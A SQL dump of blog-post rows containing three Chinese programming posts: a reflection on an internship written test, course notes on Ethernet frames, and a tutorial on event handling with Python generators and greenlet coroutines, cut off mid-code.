(91, 'https://blog.tonyseek.com/post/think-about-my-exam-of-douban/', '一次笔试经历引起的反思', '<p>前不久申请了实习，今天早上刚完成了在线笔试。总体来说题目不难，但是我答题过程并不顺利，所以写下这篇文字，反思自己的不足。实习单位要求对试题保密，故我不谈及试题，只针对自己的知识疏漏总结。</p>\n\n<div class="section" id="linux-shell">\n<h2>Linux Shell 编程能力</h2>\n<p>我一直没有系统地学习 shell，总是要用的时候才去 Google；而平时即使有空，我也不是很愿意去学习它，因为 shell 能做的 Python 都能做。经历了这次被虐，我觉得之前的这种想法十分不对——学习一样东西是为了积累，而不仅仅是为了现在有用。</p>\n<p>值得庆幸的是之前阅读博客的时候，学习了 find 和 xargs 等工具用管道组合的用法，最后回答了一部分自己知道的。不知道的用 Python 写出来替代了。虽然不符合题目要求，但是总比空着强吧。</p>\n</div>\n<div class="section" id="sql">\n<h2>SQL 查询编写能力</h2>\n<p>其实之前韩老大就提醒过我很多次，这个能力很重要。我也知道这个能力很重要，但是在自己的项目中太过于依赖 ORM，从而没有多少次实践的经历。到今天笔试为止，我对于编写 SQL 查询还只是掌握了课内水平。考的题目不是很难，但是我写了很久，在非常宝贵的 40 分钟里面是个很大的浪费，从而导致了实践题时间非常紧。</p>\n</div>\n<div class="section" id="id2">\n<h2>实践题</h2>\n<p>我知道豆瓣是用 Quixote 的，我之前玩过 Bottle 玩过 Flask 也玩过 Django，就是没玩过 Quixote。这不是关键问题，关键问题是我曾经想过尝试一下 Quixote 这种风格比较独特的框架，可以一直没有动手——如果想到就去做，今天我就可以在选做题中做更合适的选择了。</p>\n<p>其实实践题非常简单，完全可以现场尝试，但是前面 SQL 题占用太多时间，加上当初没有“想到就去做”，从而无法选 Quixote 相关的题目。最后选择了 Django 相关的，仓促之下弄得很糟糕。</p>\n</div>\n<div class="section" id="id3">\n<h2>最后总结和反省</h2>\n<ul class="simple">\n<li>学习的心态：学习一样东西是为了积累，而不仅仅是为了现在有用。</li>\n<li>想到就去做：动动手，别往后拖。</li>\n<li>问题不要积累：有能力软肋就赶快修补，不要等日后。</li>\n</ul>\n</div>', '2014-11-06 23:43:08', 6, '2012-03-20 05:14:00', '2012-03-20 05:14:00', 0, '[["Quixote", 0.1935994737311741], ["SQL", 0.14519960529838055], ["\\u5b66\\u4e60", 0.14033489433789476], ["\\u9898\\u76ee", 0.13463042904582997], ["\\u5b9e\\u8df5", 0.1078199146425911], ["\\u80fd\\u529b", 0.09990573032732793], ["Django", 0.09679973686558704], ["shell", 0.09679973686558704], ["Python", 0.09679973686558704], ["\\u73a9\\u8fc7", 0.08475052993927125], ["\\u4f46\\u662f", 0.08448641686396763], ["\\u4e4b\\u524d", 0.08410567573506073], ["\\u79ef\\u7d2f", 0.07947885922615384], ["\\u8bd5\\u9898", 0.07770536484834008], ["\\u7b14\\u8bd5", 0.07717594979360323], ["\\u5173\\u952e\\u95ee\\u9898", 0.07534864616874493], ["\\u4e3a\\u4e86", 0.07460443206105263], ["\\u5b9e\\u4e60", 0.07131115345076924], ["\\u60f3\\u5230", 0.06811492880161943], ["\\u67e5\\u8be2", 0.0653820044097166]]', NULL, NULL, '前不久申请了实习，今天早上刚完成了在线笔试。总体来说题目不难，但是我答题过程并不顺利，所以写下这篇文字，反思自己的不足。实习单位要求对试题保密，故我不谈及试题，只针对自己的知识疏漏总结。\n\n\nLinux Shell 编程能力\n我一直没有系统地学习 shell，总是要用的时候才去 Google；而平时即使有空，我也不是很愿意去学习它，因为 shell 能做的 Python 都能做。经历了这次被虐，我觉得之前的这种想法十分不对——学习一样东西是为了积累，而不仅仅是为了现在有用。\n值得庆幸的是之前阅读博客的时候，学习了 find 和 xargs 等工具用管道组合的用法，最后回答了一部分自己知道的。不知道的用 Python 写出来替代了。虽然不符合题目要求，但是总比空着强吧。\n\n\nSQL 查询编写能力\n其实之前韩老大就提醒过我很多次，这个能力很重要。我也知道这个能力很重要，但是在自己的项目中太过于依赖 ORM，从而没有多少次实践的经历。到今天笔试为止，我对于编写 SQL 查询还只是掌握了课内水平。考的题目不是很难，但是我写了很久，在非常宝贵的 40 分钟里面是个很大的浪费，从而导致了实践题时间非常紧。\n\n\n实践题\n我知道豆瓣是用 Quixote 的，我之前玩过 Bottle 玩过 Flask 也玩过 Django，就是没玩过 Quixote。这不是关键问题，关键问题是我曾经想过尝试一下 Quixote 这种风格比较独特的框架，可以一直没有动手——如果想到就去做，今天我就可以在选做题中做更合适的选择了。\n其实实践题非常简单，完全可以现场尝试，但是前面 SQL 题占用太多时间，加上当初没有“想到就去做”，从而无法选 Quixote 相关的题目。最后选择了 Django 相关的，仓促之下弄得很糟糕。\n\n\n最后总结和反省\n\n学习的心态：学习一样东西是为了积累，而不仅仅是为了现在有用。\n想到就去做：动动手，别往后拖。\n问题不要积累：有能力软肋就赶快修补，不要等日后。\n\n', NULL, NULL, NULL),
(92, 'https://blog.tonyseek.com/post/notes-about-ethernet/', '计算机网络学习笔记——以太网', '<p>这学期修读了“计算机网络”这门培养方案中开设得比较晚的基础必修课。这也是继上学期修读软件需求课程之后，我再次修读尹剑飞老师开设的课，实在受益良多——尹剑飞老师的讲解总是一语击中要点。今天特此将入门一周的知识总结记录下来，以后还会不断更新续篇。一方面如 phppan 哥所说整理知识是对自己负责，另一方面我也希望能记录下学习的脚步。</p>\n\n<div class="section" id="id2">\n<h2>计算机网络的发展史</h2>\n<p>其实知道一下发展史还是挺有用的，至少对于我来说，我知道了一点——最早的计算机网络都是区域性的，也就是今天我们所说的“局域网”。在这些网络中又有很多分类，如以太网、令牌环网等。现今比较普遍见到的是以太网（Ethernet） <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id8" id="id3">[0]</a> 。</p>\n<p>“互联网” <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id10" id="id4">[1]</a> 最初被提出来的目的，是将不同的网络连接起来。所谓不同，就是不管局域网使用的是以太网协议还是令牌环网协议，都能以隐藏内部通信细节的方式连接。如果要咬文嚼字的话，我们平时说的“因特网”是对互联网的一个实现（貌似也是目前唯一的一个实现）。</p>\n</div>\n<div class="section" id="id5">\n<h2>以太网通信方式</h2>\n<p>以太网本身是链路层协议，以帧（Frame） <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id11" id="id6">[2]</a> 的方式传送数据。由于以太网有 802.3 和 DIX Ethernet 2 两种标准，所一个“帧”是可以有不同的数据结构的。我们着重了解的是 DIX Ethernet 2 标准，在该标准中一个帧由目的地址、源地址、帧类型、数据、校验码组成。</p>\n<p><img alt="随手笔记图片" src="https://20.media.tumblr.com/tumblr_m0vq5puNWd1qheous.jpg" /></p>\n<p>其实真正在物理层传输的数据，还有一个前导同步码，用于确定帧的顺序。因为一份完整的数据可能是被切分成多个帧传送的，而网络传输的特性决定了帧不一定会按照预期顺序到达，所以网卡（物理层）会添加同步码解决这个问题。真正链路层处理的，是按顺序将地址和应用层带来的数据组合，并添加校验码。</p>\n<blockquote>\n同步码（8 bytes） | 目的地址（6 bytes） | 源地址（6 bytes） | 帧类型（2 bytes） | 数据（46~1500 bytes） | 校验码（4 bytes）</blockquote>\n<p>如果通过校验码得知帧损坏，链路层直接将该帧丢弃。具体如何重发由上层决定。</p>\n<p>对于帧中的地址，DIX 以太网使用的是“物理地址”，也就是烧录在我们网卡上的 MAC 地址。源地址一般就填写发送帧的计算机的地址，而目标地址还可以选择一些有特殊意义的虚拟地址。一般选择以下三者之一：</p>\n<ul class="simple">\n<li>单播地址：即目的计算机的物理地址，这种情况下帧传送到指定单台计算机</li>\n<li>多播地址：分配给某个“多播组”的虚拟地址，并非物理地址，指定帧传送到多播组中所有计算机</li>\n<li>广播地址：保留的一个虚拟地址 <tt class="docutils literal">FF:FF:FF:FF:FF:FF</tt> ，表示将帧传送给子网中所有计算机</li>\n</ul>\n</div>\n<div class="section" id="id7">\n<h2>计算机网络的本质</h2>\n<p>我们常说程序的本质就是算法加数据结构。对于计算机网络，尹剑飞老师却有相似的结论。</p>\n<blockquote>\n计算机网络的本质是算法加数据结构。 ——尹剑飞</blockquote>\n<p>从以太网的帧可以看出，计算机网络划分了细致的层次，本质却是将期望的数据以一定的数据结构传输，而计算机或其他网络设备则以相关的算法解析这些数据结构。</p>\n<p>我认为这是太贴切不过的总结。</p>\n<table class="docutils footnote" frame="void" id="id8" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id3">[0]</a></td><td><a class="reference external" href="https://zh.wikipedia.org/wiki/%E4%BB%A5%E5%A4%AA%E7%BD%91">以太网</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id10" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id4">[1]</a></td><td><a class="reference external" href="https://en.wikipedia.org/wiki/Internet">Internet</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id11" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id6">[2]</a></td><td><a class="reference external" href="https://en.wikipedia.org/wiki/Ethernet_frame">以太网的“帧”</a></td></tr>\n</tbody>\n</table>\n</div>', '2014-11-06 23:43:08', 6, '2012-03-14 15:01:00', '2012-03-14 15:01:00', 0, '[["\\u4ee5\\u592a\\u7f51", 0.34665881692243766], ["\\u5730\\u5740", 0.21252539192188366], ["bytes", 0.19869419672409971], ["FF", 0.19869419672409971], ["\\u8ba1\\u7b97\\u673a\\u7f51\\u7edc", 0.19368582417132965], ["\\u6570\\u636e\\u7ed3\\u6784", 0.14740417055401664], ["\\u6821\\u9a8c\\u7801", 0.13246279781606649], ["\\u5c39\\u5251\\u98de", 0.13246279781606649], ["\\u8ba1\\u7b97\\u673a", 0.11309891020853186], ["\\u4fee\\u8bfb", 0.10975787095346261], ["\\u7269\\u7406\\u5730\\u5740", 0.10214326653324099], ["Ethernet", 0.09934709836204986], ["\\u591a\\u64ad", 0.09934709836204986], ["\\u6e90\\u5730\\u5740", 0.09934709836204986], ["\\u865a\\u62df\\u5730\\u5740", 0.09934709836204986], ["DIX", 0.09934709836204986], ["\\u94fe\\u8def\\u5c42", 0.09823741919916895], ["\\u4f20\\u9001", 0.09182880382925208], ["\\u6570\\u636e", 0.07946853205080331], ["\\u7f51\\u5361", 0.07701206455401663]]', NULL, NULL, '这学期修读了“计算机网络”这门培养方案中开设得比较晚的基础必修课。这也是继上学期修读软件需求课程之后，我再次修读尹剑飞老师开设的课，实在受益良多——尹剑飞老师的讲解总是一语击中要点。今天特此将入门一周的知识总结记录下来，以后还会不断更新续篇。一方面如 phppan 哥所说整理知识是对自己负责，另一方面我也希望能记录下学习的脚步。\n\n\n计算机网络的发展史\n其实知道一下发展史还是挺有用的，至少对于我来说，我知道了一点——最早的计算机网络都是区域性的，也就是今天我们所说的“局域网”。在这些网络中又有很多分类，如以太网、令牌环网等。现今比较普遍见到的是以太网（Ethernet） [0] 。\n“互联网” [1] 最初被提出来的目的，是将不同的网络连接起来。所谓不同，就是不管局域网使用的是以太网协议还是令牌环网协议，都能以隐藏内部通信细节的方式连接。如果要咬文嚼字的话，我们平时说的“因特网”是对互联网的一个实现（貌似也是目前唯一的一个实现）。\n\n\n以太网通信方式\n以太网本身是链路层协议，以帧（Frame） [2] 的方式传送数据。由于以太网有 802.3 和 DIX Ethernet 2 两种标准，所一个“帧”是可以有不同的数据结构的。我们着重了解的是 DIX Ethernet 2 标准，在该标准中一个帧由目的地址、源地址、帧类型、数据、校验码组成。\n\n其实真正在物理层传输的数据，还有一个前导同步码，用于确定帧的顺序。因为一份完整的数据可能是被切分成多个帧传送的，而网络传输的特性决定了帧不一定会按照预期顺序到达，所以网卡（物理层）会添加同步码解决这个问题。真正链路层处理的，是按顺序将地址和应用层带来的数据组合，并添加校验码。\n\n同步码（8 bytes） | 目的地址（6 bytes） | 源地址（6 bytes） | 帧类型（2 bytes） | 数据（46~1500 bytes） | 校验码（4 bytes）\n如果通过校验码得知帧损坏，链路层直接将该帧丢弃。具体如何重发由上层决定。\n对于帧中的地址，DIX 以太网使用的是“物理地址”，也就是烧录在我们网卡上的 MAC 地址。源地址一般就填写发送帧的计算机的地址，而目标地址还可以选择一些有特殊意义的虚拟地址。一般选择以下三者之一：\n\n单播地址：即目的计算机的物理地址，这种情况下帧传送到指定单台计算机\n多播地址：分配给某个“多播组”的虚拟地址，并非物理地址，指定帧传送到多播组中所有计算机\n广播地址：保留的一个虚拟地址 FF:FF:FF:FF:FF:FF ，表示将帧传送给子网中所有计算机\n\n\n\n计算机网络的本质\n我们常说程序的本质就是算法加数据结构。对于计算机网络，尹剑飞老师却有相似的结论。\n\n计算机网络的本质是算法加数据结构。 ——尹剑飞\n从以太网的帧可以看出，计算机网络划分了细致的层次，本质却是将期望的数据以一定的数据结构传输，而计算机或其他网络设备则以相关的算法解析这些数据结构。\n我认为这是太贴切不过的总结。\n\n\n\n[0]以太网\n\n\n\n\n\n[1]Internet\n\n\n\n\n\n[2]以太网的“帧”\n\n\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(93, 'https://blog.tonyseek.com/post/event-manage-with-greenlet/', '用 greenlet 协程处理异步事件', '<p>自从 PyCon 2011 协程成为热点话题以来，我一直对此有着浓厚的兴趣。为了异步，我们曾使用多线程编程。然而线程在有着 GIL 的 Python 中带来的性能瓶颈和多线程编程的高出错风险，“协程 + 多进程”的组合渐渐被认为是未来发展的方向。技术容易更新，思维转变却需要一个过渡。我之前在异步事件处理方面已经习惯了回调 + 多线程的思维方式，转换到协程还非常的不适应。这几天我非常艰难地查阅了一些资料并思考，得出了一个可能并不可靠的总结。尽管这个总结的可靠性很值得怀疑，但是我还是决定记录下来，因为我觉得既然是学习者，就不应该怕无知。如果读者发现我的看法有偏差并指出来，我将非常感激。</p>\n\n<div class="section" id="id1">\n<h2>多线程下异步编程的方式</h2>\n<p>线程的出现，为开发者带来了除多进程之外另一种实现并发的方式。比起多进程，多线程有另一些优势，比如可以访问进程内的变量，也就是共享资源。还有的说法说线程创建比进程创建开销低，考虑到这个问题在 Windows 一类进程创建机制很蹩脚的系统才存在，故先忽略。总的来说，线程除了可以实现进程实现的“并发执行”之外，还有另一个功能，就是管理应用程序内部的“事件”。我不知道把这种事件处理分类到异步中是不是合适，但事件处理一定是基于共享进程内资源才能实现的，所以这是多线程可以做到而多进程做不到的一点。</p>\n<p>异步处理基于两个前提。第一个前提是支持并发，当然这是基本前提。这里的并发并不一定要是并行，也就是说允许逻辑上异步，实现上串行；第二个前提是支持回调（callback），因为并发的、异步的处理不会阻塞当前正在被执行的流程，所以“任务完成后”要执行的步骤应该写在回调中，绝大多数回调是通过函数来实现。</p>\n<p>多线程之所以适合异步编程，是因为它同时支持并发和回调。无论是系统级的线程还是用户级的线程，逻辑上都能并发执行不同的控制流；同时因为能共享进程内资源，所以回调只需要通过简单的回调函数。</p>\n<p>出于回调函数的处理比较杂乱，一般异步程序都引入了事件机制。也就是说把一系列的回调函数注册到某个命名的事件，当这个事件被触发的时候，执行这些回调函数。例如在 ECMAScript 中，需要在访问了远程网址之后，要把响应的结果填充到页面中，在同步（阻塞）的情况下是这么做的：</p>\n<figure class="code"><div class="highlight"><pre><span class="c1">// 在打开了豆瓣首页的标签页</span>\n<span class="c1">// 打开了一个 firebut/chrome console 测试</span>\n\n<span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>\n\n<span class="c1">// 第三个参数为 false 代表不使用异步</span>\n<span class="nx">http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;/site&quot;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>\n<span class="c1">// 发送请求</span>\n<span class="nx">http</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>\n<span class="c1">// 填充响应，一秒钟变页面</span>\n<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>\n</pre></div>\n</figure><p>处理起来非常简单，因为 XMLHttpRequest 的 send 方法会阻塞主线程，所以我们去读取 http.response 的时候一定已经完成了远程访问。如果使用基于多线程和回调函数的异步方式呢？问题会变得麻烦很多：</p>\n<figure class="code"><div class="highlight"><pre><span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>\n\n<span class="nx">http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;/site&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>\n\n<span class="c1">// 现在必须使用回调函数</span>\n<span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>\n    <span class="k">if</span> <span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="nx">http</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>\n            <span class="k">if</span> <span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>\n                    <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>\n            <span class="p">}</span>\n    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="nx">http</span><span class="p">.</span><span class="nx">LOADING</span><span class="p">)</span> <span class="p">{</span>\n            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;正在加载&lt;br /&gt;&quot;</span><span class="p">);</span>\n    <span class="p">}</span>\n<span class="p">};</span>\n\n<span class="nx">http</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>\n</pre></div>\n</figure><p>由于使用异步方式之后 send 方法不再阻塞主线程，所以必须设置 onreadystatechange 回调函数。XMLHttpRequest 有多种加载状态，每次状态改变会调用一次用户设置的回调函数。现在编程变得麻烦，但是用户体验变得更好，因为不再阻塞主线程，用户可以看到“正在加载”的提示，并且在此期间还可以异步做其他事情。为了简化回调函数的使用，一般采取两种方式改进回调，第一种方式是对于简单的回调，直接在参数中将回调函数传入，这种方式对有匿名函数的语言来说方便了很多（比如 ECMAScript 和 Ruby，显然 C 语言和 Python 不在此列）；第二种方式是对于复杂的回调，以事件管理器替代。仍然是 ajax 请求的例子，jquery 提供的封装就采取了第一种方式：</p>\n<figure class="code"><div class="highlight"><pre><span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&quot;/site&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">){</span>\n    <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>\n<span class="p">});</span>\n</pre></div>\n</figure><p>而 W3C 规定的浏览器 window 对象，则采取了事件管理器的方式管理更为复杂的异步支持：</p>\n<figure class="code"><div class="highlight"><pre><span class="c1">// 别在 IE 下试，IE 的函数名不一样。</span>\n<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;load&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>\n    <span class="c1">// do something</span>\n<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>\n</pre></div>\n</figure><p>采取事件管理器的本质还是使用回调，不过这种方式提出了“事件”的概念，将回调函数统一注册到一个管理器中，并对应到各自的“事件”，需要调用这一系列回调函数的时候，就“触发”这一个“事件”，管理器会调用注册进来的回调函数。这种做法解除了调用者和被调用者的耦合，其实就是 GoF 观察者模式 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id12" id="id2">[0]</a> 的具体应用。</p>\n</div>\n<div class="section" id="id3">\n<h2>用多线程实现异步的弊病</h2>\n<blockquote>\n“我们仍然认为，如果在连 a=a+1 都没有确定结果的语言中，无人可以写出正确的程序。” —— 《编程之魂》 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id14" id="id4">[1]</a></blockquote>\n<p>用多线程来实现异步最大的弊病，是它真的是并发的。采用线程实现的异步，即使不存在多核并行，线程执行的先后仍然是不可预知的。操作系统课程上我们也学到过，称之为不可再现性。究其原因，线程的调度毕竟是调度器来完成的，无论是系统级的调度还是用户级的调度，调度器都会因为 IO 操作、时间片用完等诸多的原因，而强制夺取某个线程的控制权。这种不可再现性给线程编程带来了极大的麻烦。如果是上段中的简单代码还没什么，若是情况更加复杂一些，在单独的线程中操作了某共享资源，那么这个共享资源就会成为危险的临界资源，一时疏忽忘记加锁就会带来数据不一致问题。而加锁本身是把对资源的并行访问串行化，所以锁往往又是拖慢系统效率的罪魁祸首，由此又发展出了多种复杂的锁机制。</p>\n<p>Unix 编程哲学强调 Simple is better，有时跳出来想想，有些复杂性是不是走了弯路导致的呢？首先，多线程编程以并发和事件机制来实现异步，并发可以带来性能的提升，同时能给我们非阻塞工作方式。对于临界资源的访问，我们又必须使之串行化，甚至诞生了管道、消息队列这种绝对串行化的通讯方式。为何不干脆就让所有的操作串行化，以此换取资源的安全，多核资源的利用则交给多进程实现呢？Python 的做法就是这样。Python 的线程是系统级线程，由内核调度，却不是真正的并发执行。因为 Python 有一个全局解释器锁（GIL），它导致 Python 内部的线程执行实质上是串行的。</p>\n<p>串行的线程无法充分利用多核资源，但是换来了线程安全，看上去是比较明智的选择，但 Python 的线程却有个很大的缺点 —— 这些线程是系统级的。系统级线程由内核来调度，调度的开销会比想象的要大，而很多情况下这些调度开销是付出的很没有价值的。比如一次异步的远程网址获取，本来只需要在开始访问网络的时候释放主线程控制权，得到响应之后返回主线程控制权，使用系统级线程之后调度全部委托给了系统内核，简单问题往往就复杂化了。协程（Coroutine） <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id15" id="id5">[2]</a> 提供了不同于线程的另一种方式，它首先是串行化的。其次，在串行化的过程中，协程允许用户显式释放控制权，将控制权转移另一个过程。释放控制权之后，原过程的状态得以保留，直到控制权恢复的时候，可以继续执行下去。所以协程的控制权转移也称为“挂起”和“唤醒”。</p>\n</div>\n<div class="section" id="python">\n<h2>Python 中的协程</h2>\n<p>其实 Python 语言内置了协程的支持，也就是我们一般用来制作迭代期的“生成器”（Generator）。生成器本身不是一个完整的协程实现，所以此外 Python 的第三方库中还有一个优秀的替代品 greenlet <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id17" id="id6">[3]</a> 。</p>\n<p>使用生成器作为协程支持，可以实现简单的事件调度模型：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>\n\n<span class="c"># Event Manager</span>\n\n<span class="n">event_listeners</span> <span class="o">=</span> <span class="p">{}</span>\n\n<span class="k">def</span> <span class="nf">fire_event</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>\n    <span class="n">event_listeners</span><span class="p">[</span><span class="n">name</span><span class="p">]()</span>\n\n<span class="k">def</span> <span class="nf">use_event</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>\n    <span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>\n        <span class="n">generator</span> <span class="o">=</span> <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>\n        <span class="c"># 执行到挂起</span>\n        <span class="n">event_name</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">generator</span><span class="p">)</span>\n        <span class="c"># 将“唤醒挂起的协程”注册到事件管理器中</span>\n        <span class="k">def</span> <span class="nf">resume</span><span class="p">():</span>\n            <span class="k">try</span><span class="p">:</span>\n                <span class="nb">next</span><span class="p">(</span><span class="n">generator</span><span class="p">)</span>\n            <span class="k">except</span> <span class="ne">StopIteration</span><span class="p">:</span>\n                <span class="k">pass</span>\n        <span class="n">event_listeners</span><span class="p">[</span><span class="n">event_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">resume</span>\n    <span class="k">return</span> <span class="n">call</span>\n\n<span class="c"># Test</span>\n\n<span class="nd">@use_event</span>\n<span class="k">def</span> <span class="nf">test_work</span><span class="p">():</span>\n    <span class="k">print</span><span class="p">(</span><span class="s">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>\n    <span class="k">print</span><span class="p">(</span><span class="s">&quot;waiting click&quot;</span><span class="p">)</span>\n    <span class="k">yield</span> <span class="s">&quot;click&quot;</span>  <span class="c"># 挂起当前协程, 等待事件</span>\n    <span class="k">print</span><span class="p">(</span><span class="s">&quot;clicked !!&quot;</span><span class="p">)</span>\n\n<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>\n    <span class="n">test_work</span><span class="p">()</span>\n    <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c"># 做了很多其他事情</span>\n    <span class="n">fire_event</span><span class="p">(</span><span class="s">&quot;click&quot;</span><span class="p">)</span>  <span class="c"># 触发了 click 事件</span>\n</pre></div>\n</figure><p>测试运行可以看到，打印出“waiting click”之后，暂停了三秒，也就是协程被挂起，控制权回到主控制流上，之后触发“click”事件，协程被唤醒。协程的这种“挂起”和“唤醒”机制实质上是将一个过程切分成了若干个子过程，给了我们一种以扁平的方式来使用事件回调模型。</p>\n</div>\n<div class="section" id="id7">\n<h2>用 greenlet 实现简单事件框架</h2>\n<p>用生成器实现的协程有些繁琐，同时生成器本身也不是完整的协程实现，因此经常有人批评 Python 的协程比 Lua 弱。其实 Python 中只要放下生成器，使用第三方库 greenlet，就可以媲美 Lua 的原生协程了。greenlet 提供了在协程中直接切换控制权的方式，比生成器更加灵活、简洁。</p>\n<p>基于把协程看成“切开了的回调”的视角，我使用 greenlet 制作了一个简单的事件框架。</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">greenlet</span> <span class="kn">import</span> <span class="n">greenlet</span><span class="p">,</span> <span class="n">getcurrent</span>\n\n\n<span class="k">class</span> <span class="nc">Event</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">listeners</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>\n\n    <span class="k">def</span> <span class="nf">listen</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">listener</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">listeners</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">listener</span><span class="p">)</span>\n\n    <span class="k">def</span> <span class="nf">fire</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="k">for</span> <span class="n">listener</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">listeners</span><span class="p">:</span>\n            <span class="n">listener</span><span class="p">()</span>\n\n\n<span class="k">class</span> <span class="nc">EventManager</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">events</span> <span class="o">=</span> <span class="p">{}</span>\n\n    <span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">events</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">Event</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>\n\n    <span class="k">def</span> <span class="nf">fire</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">events</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="o">.</span><span class="n">fire</span><span class="p">()</span>\n\n    <span class="k">def</span> <span class="nf">await</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event_name</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">events</span><span class="p">[</span><span class="n">event_name</span><span class="p">]</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="n">getcurrent</span><span class="p">()</span><span class="o">.</span><span class="n">switch</span><span class="p">)</span>\n        <span class="n">getcurrent</span><span class="p">()</span><span class="o">.</span><span class="n">parent</span><span class="o">.</span><span class="n">switch</span><span class="p">()</span>\n\n    <span class="k">def</span> <span class="nf">use</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> 